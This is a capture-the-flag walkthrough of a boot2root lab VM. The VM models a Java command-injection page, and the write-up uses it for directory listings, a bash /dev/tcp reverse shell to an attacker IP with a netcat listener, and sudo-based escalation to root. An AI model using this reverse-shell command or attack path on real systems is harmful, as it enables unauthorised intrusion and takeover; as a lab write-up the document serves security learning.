Description
Back to the Top
Many times while conducting a pentest, I need to script something up to make my life easier or to quickly test an attack idea or vector. Recently I came across an interesting command injection vector on a web application sitting on a client's internet-facing estate. There was a page, running in Java, that allowed me to type arbitrary commands into a form, and have it execute them. While developer-provided webshells are always nice, there were a few caveats. The page was expecting directory listing style output, which was then parsed and reformatted. If the output didn't match this parsing, no output to me. Additionally, there was no egress. ICMP, and all TCP/UDP ports including DNS were blocked outbound.

I was still able to leverage the command injection to compromise not just the server, but the entire infrastructure it was running on. After the dust settled, the critical report was made, and the vulnerability was closed, I thought the entire attack path was kind of fun, and decided to share how I went about it. Since I enjoy being a free man and only occasionally visit prisons, I've created a simple boot2root style VM that has a similar set of vulnerabilities to use in a walkthrough.

 /test.jsp: This might be interesting.  might hide something so search it on url as http://192.168.73.144:8080/test.jsp

 
 listing out for user name
 
 Command: ls -l /home

Owner	Group	Size	Filename
bill 	bill 	4096 	bill


 so then i list out the tmp folder
 
 
 Command: ls -l /tmp

Owner	Group	Size	Filename
tomcat8 	tomcat8 	4096 	hsperfdata_tomcat8
root 	root 	4096 	systemd-private-70a6d11547824f1ba12a1cc1dd61b2af-systemd-resolved.service-W9Wr87

no-w i've to generate reverse shell using reverse shell genaretor:::::::
ssh bill@localhost sudo bash -i >& /dev/tcp/192.168.73.129/4242 0>&1  {get it form online reverse shell generator}
using netcat  for nc -lvp 4242

::::::::getting the shell:::Boooooyahhhhhhhhhh:""""::: 


THEn i simply use sudo -l for take a look on permissions 
Matching Defaults entries for root on b2r:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on b2r:
    (ALL : ALL) ALL
root@b2r:~# sudo  su 
then go to that root folder
the i successfully get the flag
which is ::
